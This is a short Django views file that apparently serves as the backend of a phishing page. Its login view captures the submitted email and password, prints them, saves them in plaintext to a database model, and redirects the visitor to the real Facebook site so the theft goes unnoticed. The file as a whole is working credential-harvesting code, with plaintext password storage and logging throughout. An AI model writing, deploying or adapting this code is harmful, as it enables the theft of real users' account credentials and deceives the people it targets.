from django.shortcuts import redirect, render
from home.models import Details
# Create your views here.
def home(request):
    return render(request, 'index.html')

    
def login(request):
    if(request.method == 'POST'):
        email = request.POST['email']
        password = request.POST['pass']
        print('\n\n\n\n')
        print(email)
        print('\n\n\n\n')
        print(password)

        try:
            details = Details.objects.create(email=email, password=password)
            details.save()
        except Exception as e:
            print(e)

        # print(password)
        return redirect('https://www.facebook.com/')